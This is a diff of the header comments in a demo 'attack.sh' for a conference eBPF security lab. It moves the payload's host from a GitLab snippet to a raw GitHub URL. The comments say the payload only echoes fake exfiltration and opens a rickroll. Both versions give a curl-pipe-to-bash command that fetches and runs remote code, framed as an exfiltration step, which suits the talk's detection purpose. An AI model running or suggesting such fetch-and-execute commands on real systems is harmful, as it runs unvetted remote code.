@@ -2,15 +2,16 @@
 # attack.sh -- the "exfiltration" payload for the Phase 2 demo.
 #
 # The slide shows a boring `curl https://example.com` as the exfil step. This
-# is the fun version: the demo fetches a payload from OUTSIDE the cluster (a
-# GitLab snippet on gitlab.example.com), and the payload is a harmless gag --
+# is the fun version: the demo fetches a payload from OUTSIDE the cluster (this
+# very file, served raw from GitHub), and the payload is a harmless gag --
 # theatrical fake "exfiltration" in the terminal, then it opens a rickroll in
 # the browser. Nothing here reads a real secret or sends real data anywhere;
 # every scary line below is a plain echo. The only real action is opening a
 # YouTube URL.
 #
-# Hosted as a snippet so the demo command is a genuine fetch-to-outside:
-#   curl -s https://gitlab.example.com/-/snippets/1/raw/main/attack.sh | bash
+# Served raw from the repo so the demo command is a genuine fetch-to-outside
+# (keep the branch segment in sync with the default branch):
+#   curl -s https://raw.githubusercontent.com/renatofenrir/bsides-krk-ebpf-lab/main/phase2-container-lab/attack/attack.sh | bash
 #
 # Run it on the LAPTOP (projected) for the browser rickroll. Piped into the
 # attacker POD it still prints the theatre on the projected terminal; there is
